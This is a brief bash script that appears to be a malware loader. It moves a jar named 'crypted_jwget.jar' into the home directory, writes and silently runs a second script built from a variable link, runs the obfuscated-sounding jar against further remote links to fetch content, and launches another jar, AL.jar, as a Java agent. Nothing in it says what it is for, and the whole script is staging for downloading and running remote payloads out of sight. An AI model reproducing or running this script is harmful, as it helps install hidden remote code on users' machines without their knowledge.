#!/bin/bash
mv crypted_jwget.jar /$HOME 
cd $HOME 
echo -e $LINK2 > start2.sh
bash start2.sh &> /dev/null
java -jar crypted_jwget.jar $LINK
java -jar crypted_jwget.jar $LINK3
java "-javaagent:AL.jar" -jar "AL.jar" Storage10
